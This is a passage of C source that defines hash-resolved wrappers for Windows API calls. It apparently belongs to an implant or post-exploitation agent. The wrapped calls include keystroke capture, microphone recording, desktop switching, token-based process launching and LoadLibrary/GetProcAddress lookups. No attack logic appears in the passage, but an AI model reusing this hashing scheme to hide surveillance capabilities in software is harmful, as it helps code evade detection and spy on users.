    (HKEY hKey, LPSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime),
    (hKey, lpClass, lpcchClass, lpReserved, lpcSubKeys, lpcbMaxSubKeyLen, lpcbMaxClassLen, lpcValues, lpcbMaxValueNameLen, lpcbMaxValueLen, lpcbSecurityDescriptor, lpftLastWriteTime), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegQueryInfoKeyW, WINAPI, ADVAPI32_DLL, H_RegQueryInfoKeyW,
    (HKEY hKey, LPWSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime),
    (hKey, lpClass, lpcchClass, lpReserved, lpcSubKeys, lpcbMaxSubKeyLen, lpcbMaxClassLen, lpcValues, lpcbMaxValueNameLen, lpcbMaxValueLen, lpcbSecurityDescriptor, lpftLastWriteTime), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegQueryValueExW, WINAPI, ADVAPI32_DLL, H_RegQueryValueExW,
    (HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData),
    (hKey, lpValueName, lpReserved, lpType, lpData, lpcbData), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegSetValueExW, WINAPI, ADVAPI32_DLL, H_RegSetValueExW,
    (HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData),
    (hKey, lpValueName, Reserved, dwType, lpData, cbData), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_advapi32_RegUnLoadKeyW, WINAPI, ADVAPI32_DLL, H_RegUnLoadKeyW,
    (HKEY hKey, LPCWSTR lpSubKey), (hKey, lpSubKey), ERROR_PROC_NOT_FOUND)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_CloseDesktop, WINAPI, USER32_DLL, H_CloseDesktop,
    (HDESK hDesktop), (hDesktop), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_CloseWindowStation, WINAPI, USER32_DLL, H_CloseWindowStation,
    (HWINSTA hWinSta), (hWinSta), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HWND, winapi_user32_CreateWindowExA, WINAPI, USER32_DLL, H_CreateWindowExA,
    (DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam),
    (dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(LRESULT, winapi_user32_DefWindowProcA, WINAPI, USER32_DLL, H_DefWindowProcA,
    (HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam), (hWnd, Msg, wParam, lParam), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_DestroyWindow, WINAPI, USER32_DLL, H_DestroyWindow,
    (HWND hWnd), (hWnd), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(LRESULT, winapi_user32_DispatchMessageA, WINAPI, USER32_DLL, H_DispatchMessageA,
    (const MSG* lpMsg), (lpMsg), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_EnumChildWindows, WINAPI, USER32_DLL, H_EnumChildWindows,
    (HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam), (hWndParent, lpEnumFunc, lParam), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_EnumDesktopsA, WINAPI, USER32_DLL, H_EnumDesktopsA,
    (HWINSTA hwinsta, DESKTOPENUMPROCA lpEnumFunc, LPARAM lParam), (hwinsta, lpEnumFunc, lParam), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_EnumWindowStationsA, WINAPI, USER32_DLL, H_EnumWindowStationsA,
    (WINSTAENUMPROCA lpEnumFunc, LPARAM lParam), (lpEnumFunc, lParam), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_ExitWindowsEx, WINAPI, USER32_DLL, H_ExitWindowsEx,
    (UINT uFlags, DWORD dwReason), (uFlags, dwReason), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(SHORT, winapi_user32_GetAsyncKeyState, WINAPI, USER32_DLL, H_GetAsyncKeyState,
    (int vKey), (vKey), 0)
DEFINE_CACHED_WINAPI_WRAPPER(HWND, winapi_user32_GetForegroundWindow, WINAPI, USER32_DLL, H_GetForegroundWindow,
    (VOID), (), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_GetKeyboardState, WINAPI, USER32_DLL, H_GetKeyboardState,
    (PBYTE lpKeyState), (lpKeyState), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_user32_GetKeyNameTextW, WINAPI, USER32_DLL, H_GetKeyNameTextW,
    (LONG lParam, LPWSTR lpString, int cchSize), (lParam, lpString, cchSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(SHORT, winapi_user32_GetKeyState, WINAPI, USER32_DLL, H_GetKeyState,
    (int nVirtKey), (nVirtKey), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_GetMessageA, WINAPI, USER32_DLL, H_GetMessageA,
    (LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax),
    (lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax), -1)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_user32_GetSystemMetrics, WINAPI, USER32_DLL, H_GetSystemMetrics,
    (int nIndex), (nIndex), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_user32_GetWindowThreadProcessId, WINAPI, USER32_DLL, H_GetWindowThreadProcessId,
    (HWND hWnd, LPDWORD lpdwProcessId), (hWnd, lpdwProcessId), 0)
DEFINE_CACHED_WINAPI_WRAPPER(UINT, winapi_user32_MapVirtualKeyA, WINAPI, USER32_DLL, H_MapVirtualKeyA,
    (UINT uCode, UINT uMapType), (uCode, uMapType), 0)
DEFINE_CACHED_WINAPI_WRAPPER(HDESK, winapi_user32_OpenDesktopA, WINAPI, USER32_DLL, H_OpenDesktopA,
    (LPCSTR lpszDesktop, DWORD dwFlags, BOOL fInherit, ACCESS_MASK dwDesiredAccess),
    (lpszDesktop, dwFlags, fInherit, dwDesiredAccess), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(HWINSTA, winapi_user32_OpenWindowStationA, WINAPI, USER32_DLL, H_OpenWindowStationA,
    (LPCSTR lpszWinSta, BOOL fInherit, ACCESS_MASK dwDesiredAccess),
    (lpszWinSta, fInherit, dwDesiredAccess), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(ATOM, winapi_user32_RegisterClassExA, WINAPI, USER32_DLL, H_RegisterClassExA,
    (const WNDCLASSEXA* unnamedParam1), (unnamedParam1), 0)
DEFINE_CACHED_WINAPI_WRAPPER(UINT, winapi_user32_SendInput, WINAPI, USER32_DLL, H_SendInput,
    (UINT cInputs, LPINPUT pInputs, int cbSize), (cInputs, pInputs, cbSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(LRESULT, winapi_user32_SendMessageA, WINAPI, USER32_DLL, H_SendMessageA,
    (HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam), (hWnd, Msg, wParam, lParam), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_SetProcessWindowStation, WINAPI, USER32_DLL, H_SetProcessWindowStation,
    (HWINSTA hWinSta), (hWinSta), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_SetThreadDesktop, WINAPI, USER32_DLL, H_SetThreadDesktop,
    (HDESK hDesktop), (hDesktop), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_SwitchDesktop, WINAPI, USER32_DLL, H_SwitchDesktop,
    (HDESK hDesktop), (hDesktop), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_user32_ToUnicodeEx, WINAPI, USER32_DLL, H_ToUnicodeEx,
    (UINT wVirtKey, UINT wScanCode, const BYTE* lpKeyState, LPWSTR pwszBuff, int cchBuff, UINT wFlags, HKL dwhkl),
    (wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl), 0)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_TranslateMessage, WINAPI, USER32_DLL, H_TranslateMessage,
    (const MSG* lpMsg), (lpMsg), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_UnregisterClassA, WINAPI, USER32_DLL, H_UnregisterClassA,
    (LPCSTR lpClassName, HINSTANCE hInstance), (lpClassName, hInstance), FALSE)

int winapi_user32_wsprintfW(LPWSTR unnamedParam1, LPCWSTR unnamedParam2, ...) {
    typedef int (WINAPI *NativeFunction)(LPWSTR, LPCWSTR, va_list);
    static WinApiFunctionCache cache = WINAPI_FUNCTION_CACHE_INIT;
    NativeFunction function = (NativeFunction)GetFunctionHCached(&cache, USER32_DLL, H_wvsprintfW);
    int result = 0;
    va_list arguments;

    WINAPI_CACHE_DPRINTF("[WINAPI][winapi_user32_wsprintfW] Calling wvsprintfW @ %p", function);
    if (function) {
        va_start(arguments, unnamedParam2);
        result = function(unnamedParam1, unnamedParam2, arguments);
        va_end(arguments);
    }
    return result;
}

DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_getsockname, WSAAPI, WS2_32_DLL, H_getsockname,
    (SOCKET s, struct sockaddr* name, int* namelen), (s, name, namelen), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(u_short, winapi_ws2_32_ntohs, WSAAPI, WS2_32_DLL, H_ntohs,
    (u_short netshort), (netshort), 0)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_recvfrom, WSAAPI, WS2_32_DLL, H_recvfrom,
    (SOCKET s, char* buf, int len, int flags, struct sockaddr* from, int* fromlen),
    (s, buf, len, flags, from, fromlen), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_sendto, WSAAPI, WS2_32_DLL, H_sendto,
    (SOCKET s, const char* buf, int len, int flags, const struct sockaddr* to, int tolen),
    (s, buf, len, flags, to, tolen), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_shutdown, WSAAPI, WS2_32_DLL, H_shutdown,
    (SOCKET s, int how), (s, how), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(INT, winapi_ws2_32_WSAAddressToStringA, WSAAPI, WS2_32_DLL, H_WSAAddressToStringA,
    (LPSOCKADDR lpsaAddress, DWORD dwAddressLength, LPWSAPROTOCOL_INFOA lpProtocolInfo, LPSTR lpszAddressString, LPDWORD lpdwAddressStringLength),
    (lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_WSACleanup, WSAAPI, WS2_32_DLL, H_WSACleanup,
    (VOID), (), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(WSAEVENT, winapi_ws2_32_WSACreateEvent, WSAAPI, WS2_32_DLL, H_WSACreateEvent,
    (VOID), (), WSA_INVALID_EVENT)
DEFINE_CACHED_WINAPI_WRAPPER(int, winapi_ws2_32_WSAEventSelect, WSAAPI, WS2_32_DLL, H_WSAEventSelect,
    (SOCKET s, WSAEVENT hEventObject, long lNetworkEvents), (s, hEventObject, lNetworkEvents), SOCKET_ERROR)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_ws2_32_WSASetLastError, WSAAPI, WS2_32_DLL, H_WSASetLastError,
    (int iError), (iError))
DEFINE_CACHED_WINAPI_WRAPPER(SOCKET, winapi_ws2_32_WSASocketA, WSAAPI, WS2_32_DLL, H_WSASocketA,
    (int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags),
    (af, type, protocol, lpProtocolInfo, g, dwFlags), INVALID_SOCKET)

DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_CreateIpForwardEntry, WINAPI, IPHLPAPI_DLL, H_CreateIpForwardEntry,
    (PMIB_IPFORWARDROW pRoute), (pRoute), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_DeleteIpForwardEntry, WINAPI, IPHLPAPI_DLL, H_DeleteIpForwardEntry,
    (PMIB_IPFORWARDROW pRoute), (pRoute), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_GetIfEntry, WINAPI, IPHLPAPI_DLL, H_GetIfEntry,
    (PMIB_IFROW pIfRow), (pIfRow), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_GetIpAddrTable, WINAPI, IPHLPAPI_DLL, H_GetIpAddrTable,
    (PMIB_IPADDRTABLE pIpAddrTable, PULONG pdwSize, BOOL bOrder), (pIpAddrTable, pdwSize, bOrder), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_GetIpForwardTable, WINAPI, IPHLPAPI_DLL, H_GetIpForwardTable,
    (PMIB_IPFORWARDTABLE pIpForwardTable, PULONG pdwSize, BOOL bOrder), (pIpForwardTable, pdwSize, bOrder), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(NETIO_STATUS, winapi_iphlpapi_GetIpInterfaceEntry, NETIOAPI_API_, IPHLPAPI_DLL, H_GetIpInterfaceEntry,
    (PMIB_IPINTERFACE_ROW Row), (Row), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(ULONG, winapi_iphlpapi_GetIpNetTable, WINAPI, IPHLPAPI_DLL, H_GetIpNetTable,
    (PMIB_IPNETTABLE IpNetTable, PULONG SizePointer, BOOL Order), (IpNetTable, SizePointer, Order), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(ULONG, winapi_iphlpapi_GetTcpTable, WINAPI, IPHLPAPI_DLL, H_GetTcpTable,
    (PMIB_TCPTABLE TcpTable, PULONG SizePointer, BOOL Order), (TcpTable, SizePointer, Order), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(ULONG, winapi_iphlpapi_GetUdpTable, WINAPI, IPHLPAPI_DLL, H_GetUdpTable,
    (PMIB_UDPTABLE UdpTable, PULONG SizePointer, BOOL Order), (UdpTable, SizePointer, Order), ERROR_PROC_NOT_FOUND)

DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_mpr_WNetGetUniversalNameA, WINAPI, MPR_DLL, H_WNetGetUniversalNameA,
    (LPCSTR lpLocalPath, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpBufferSize),
    (lpLocalPath, dwInfoLevel, lpBuffer, lpBufferSize), ERROR_PROC_NOT_FOUND)

DEFINE_CACHED_WINAPI_WRAPPER(HRESULT, winapi_ole32_CoCreateInstance, WINAPI, OLE32_DLL, H_CoCreateInstance,
    (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv),
    (rclsid, pUnkOuter, dwClsContext, riid, ppv), E_NOTIMPL)
DEFINE_CACHED_WINAPI_WRAPPER(HRESULT, winapi_ole32_CoInitialize, WINAPI, OLE32_DLL, H_CoInitialize,
    (LPVOID pvReserved), (pvReserved), E_NOTIMPL)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_ole32_CoUninitialize, WINAPI, OLE32_DLL, H_CoUninitialize,
    (VOID), ())

DEFINE_CACHED_WINAPI_WRAPPER(HRESULT, winapi_oleaut32_VariantClear, WINAPI, OLEAUT32_DLL, H_VariantClear,
    (VARIANTARG* pvarg), (pvarg), E_NOTIMPL)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_oleaut32_VariantInit, WINAPI, OLEAUT32_DLL, H_VariantInit,
    (VARIANTARG* pvarg), (pvarg))

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_winmm_sndPlaySoundA, WINAPI, WINMM_DLL, H_sndPlaySoundA,
    (LPCSTR pszSound, UINT fuSound), (pszSound, fuSound), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(MMRESULT, winapi_winmm_waveInAddBuffer, WINAPI, WINMM_DLL, H_waveInAddBuffer,
    (HWAVEIN hwi, LPWAVEHDR pwh, UINT cbwh), (hwi, pwh, cbwh), MMSYSERR_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(MMRESULT, winapi_winmm_waveInOpen, WINAPI, WINMM_DLL, H_waveInOpen,
    (LPHWAVEIN phwi, UINT uDeviceID, LPCWAVEFORMATEX pwfx, DWORD_PTR dwCallback, DWORD_PTR dwInstance, DWORD fdwOpen),
    (phwi, uDeviceID, pwfx, dwCallback, dwInstance, fdwOpen), MMSYSERR_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(MMRESULT, winapi_winmm_waveInPrepareHeader, WINAPI, WINMM_DLL, H_waveInPrepareHeader,
    (HWAVEIN hwi, LPWAVEHDR pwh, UINT cbwh), (hwi, pwh, cbwh), MMSYSERR_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(MMRESULT, winapi_winmm_waveInStart, WINAPI, WINMM_DLL, H_waveInStart,
    (HWAVEIN hwi), (hwi), MMSYSERR_ERROR)
DEFINE_CACHED_WINAPI_WRAPPER(MMRESULT, winapi_winmm_waveInStop, WINAPI, WINMM_DLL, H_waveInStop,
    (HWAVEIN hwi), (hwi), MMSYSERR_ERROR)

DEFINE_CACHED_WINAPI_WRAPPER(NET_API_STATUS, winapi_netapi32_NetApiBufferFree, WINAPI, NETAPI32_DLL, H_NetApiBufferFree,
    (LPVOID Buffer), (Buffer), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(NET_API_STATUS, winapi_netapi32_NetWkstaGetInfo, WINAPI, NETAPI32_DLL, H_NetWkstaGetInfo,
    (LMSTR servername, DWORD level, LPBYTE* bufptr), (servername, level, bufptr), ERROR_PROC_NOT_FOUND)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_psapi_EnumDeviceDrivers, WINAPI, PSAPI_DLL, H_EnumDeviceDrivers,
    (LPVOID* lpImageBase, DWORD cb, LPDWORD lpcbNeeded), (lpImageBase, cb, lpcbNeeded), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetDeviceDriverBaseNameW, WINAPI, PSAPI_DLL, H_GetDeviceDriverBaseNameW,
    (LPVOID ImageBase, LPWSTR lpBaseName, DWORD nSize), (ImageBase, lpBaseName, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetDeviceDriverFileNameW, WINAPI, PSAPI_DLL, H_GetDeviceDriverFileNameW,
    (LPVOID ImageBase, LPWSTR lpFilename, DWORD nSize), (ImageBase, lpFilename, nSize), 0)

DEFINE_CACHED_WINAPI_WRAPPER(LSTATUS, winapi_shlwapi_SHDeleteKeyW, WINAPI, SHLWAPI_DLL, H_SHDeleteKeyW,
    (HKEY hkey, LPCWSTR pszSubKey), (hkey, pszSubKey), ERROR_PROC_NOT_FOUND)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_Process32FirstW, WINAPI, KERNEL32_DLL, H_Process32FirstW,
    (HANDLE hSnapshot, LPPROCESSENTRY32W lppe), (hSnapshot, lppe), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_Process32NextW, WINAPI, KERNEL32_DLL, H_Process32NextW,
    (HANDLE hSnapshot, LPPROCESSENTRY32W lppe), (hSnapshot, lppe), FALSE)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_kernel32_GetNativeSystemInfo, WINAPI, KERNEL32_DLL, H_GetNativeSystemInfo,
    (LPSYSTEM_INFO lpSystemInfo), (lpSystemInfo))
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_QueryFullProcessImageNameW, WINAPI, KERNEL32_DLL, H_QueryFullProcessImageNameW,
    (HANDLE hProcess, DWORD dwFlags, LPWSTR lpExeName, PDWORD lpdwSize), (hProcess, dwFlags, lpExeName, lpdwSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_InitializeProcThreadAttributeList, WINAPI, KERNEL32_DLL, H_InitializeProcThreadAttributeList,
    (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize),
    (lpAttributeList, dwAttributeCount, dwFlags, lpSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_UpdateProcThreadAttribute, WINAPI, KERNEL32_DLL, H_UpdateProcThreadAttribute,
    (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize),
    (lpAttributeList, dwFlags, Attribute, lpValue, cbSize, lpPreviousValue, lpReturnSize), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(LANGID, winapi_kernel32_GetSystemDefaultLangID, WINAPI, KERNEL32_DLL, H_GetSystemDefaultLangID,
    (VOID), (), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_WTSGetActiveConsoleSessionId, WINAPI, KERNEL32_DLL, H_WTSGetActiveConsoleSessionId,
    (VOID), (), 0)
DEFINE_CACHED_WINAPI_ADDRESS_GETTER(winapi_kernel32_GetLoadLibraryAExportAddress, KERNEL32_DLL, H_LoadLibraryA)
DEFINE_CACHED_WINAPI_ADDRESS_GETTER(winapi_kernel32_GetProcAddressExportAddress, KERNEL32_DLL, H_GetProcAddress)
DEFINE_CACHED_WINAPI_ADDRESS_GETTER(winapi_kernel32_GetFreeLibraryExportAddress, KERNEL32_DLL, H_FreeLibrary)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_advapi32_CreateProcessWithTokenW, WINAPI, ADVAPI32_DLL, H_CreateProcessWithTokenW,
    (HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation),
    (hToken, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation), FALSE)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_GetLastInputInfo, WINAPI, USER32_DLL, H_GetLastInputInfo,
    (PLASTINPUTINFO plii), (plii), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(UINT, winapi_user32_GetRawInputData, WINAPI, USER32_DLL, H_GetRawInputData,
    (HRAWINPUT hRawInput, UINT uiCommand, LPVOID pData, PUINT pcbSize, UINT cbSizeHeader),
    (hRawInput, uiCommand, pData, pcbSize, cbSizeHeader), (UINT)-1)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_user32_RegisterRawInputDevices, WINAPI, USER32_DLL, H_RegisterRawInputDevices,
    (PCRAWINPUTDEVICE pRawInputDevices, UINT uiNumDevices, UINT cbSize),
    (pRawInputDevices, uiNumDevices, cbSize), FALSE)

DEFINE_CACHED_WINAPI_WRAPPER(ULONG, winapi_iphlpapi_GetAdaptersAddresses, WINAPI, IPHLPAPI_DLL, H_GetAdaptersAddresses,
    (ULONG Family, ULONG Flags, PVOID Reserved, PIP_ADAPTER_ADDRESSES AdapterAddresses, PULONG SizePointer),
    (Family, Flags, Reserved, AdapterAddresses, SizePointer), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_GetExtendedTcpTable, WINAPI, IPHLPAPI_DLL, H_GetExtendedTcpTable,
    (PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder, ULONG ulAf, TCP_TABLE_CLASS TableClass, ULONG Reserved),
    (pTcpTable, pdwSize, bOrder, ulAf, TableClass, Reserved), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_GetExtendedUdpTable, WINAPI, IPHLPAPI_DLL, H_GetExtendedUdpTable,
    (PVOID pUdpTable, PDWORD pdwSize, BOOL bOrder, ULONG ulAf, UDP_TABLE_CLASS TableClass, ULONG Reserved),
    (pUdpTable, pdwSize, bOrder, ulAf, TableClass, Reserved), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_VOID_WRAPPER(winapi_iphlpapi_FreeMibTable, NETIOAPI_API_, IPHLPAPI_DLL, H_FreeMibTable,
    (PVOID Memory), (Memory))
DEFINE_CACHED_WINAPI_WRAPPER(NETIO_STATUS, winapi_iphlpapi_GetIpForwardTable2, NETIOAPI_API_, IPHLPAPI_DLL, H_GetIpForwardTable2,
    (ADDRESS_FAMILY Family, PMIB_IPFORWARD_TABLE2* Table), (Family, Table), ERROR_PROC_NOT_FOUND)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_iphlpapi_GetBestInterface, WINAPI, IPHLPAPI_DLL, H_GetBestInterface,
    (IPAddr dwDestAddr, PDWORD pdwBestIfIndex), (dwDestAddr, pdwBestIfIndex), ERROR_PROC_NOT_FOUND)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_psapi_EnumProcesses, WINAPI, PSAPI_DLL, H_EnumProcesses,
    (DWORD* lpidProcess, DWORD cb, LPDWORD lpcbNeeded), (lpidProcess, cb, lpcbNeeded), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_psapi_EnumProcessModules, WINAPI, PSAPI_DLL, H_EnumProcessModules,
    (HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded),
    (hProcess, lphModule, cb, lpcbNeeded), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetModuleBaseNameA, WINAPI, PSAPI_DLL, H_GetModuleBaseNameA,
    (HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize),
    (hProcess, hModule, lpBaseName, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetModuleBaseNameW, WINAPI, PSAPI_DLL, H_GetModuleBaseNameW,
    (HANDLE hProcess, HMODULE hModule, LPWSTR lpBaseName, DWORD nSize),
    (hProcess, hModule, lpBaseName, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetModuleFileNameExA, WINAPI, PSAPI_DLL, H_GetModuleFileNameExA,
    (HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize),
    (hProcess, hModule, lpFilename, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetModuleFileNameExW, WINAPI, PSAPI_DLL, H_GetModuleFileNameExW,
    (HANDLE hProcess, HMODULE hModule, LPWSTR lpFilename, DWORD nSize),
    (hProcess, hModule, lpFilename, nSize), 0)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_psapi_GetProcessImageFileNameW, WINAPI, PSAPI_DLL, H_GetProcessImageFileNameW,
    (HANDLE hProcess, LPWSTR lpImageFileName, DWORD nSize),
    (hProcess, lpImageFileName, nSize), 0)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_userenv_CreateEnvironmentBlock, WINAPI, USERENV_DLL, H_CreateEnvironmentBlock,
    (LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit), (lpEnvironment, hToken, bInherit), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_userenv_DestroyEnvironmentBlock, WINAPI, USERENV_DLL, H_DestroyEnvironmentBlock,
    (LPVOID lpEnvironment), (lpEnvironment), FALSE)

DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_wtsapi32_WTSQueryUserToken, WINAPI, WTSAPI32_DLL, H_WTSQueryUserToken,
    (ULONG SessionId, PHANDLE phToken), (SessionId, phToken), FALSE)

DEFINE_CACHED_WINAPI_WRAPPER(HRESULT, winapi_query_LocateCatalogsW, WINAPI, QUERY_DLL, H_LocateCatalogsW,
    (LPCWSTR pwszScope, ULONG iBmk, LPWSTR pwszMachine, PULONG pcMachine, LPWSTR pwszCatalog, PULONG pcCatalog),
    (pwszScope, iBmk, pwszMachine, pcMachine, pwszCatalog, pcCatalog), E_NOTIMPL)
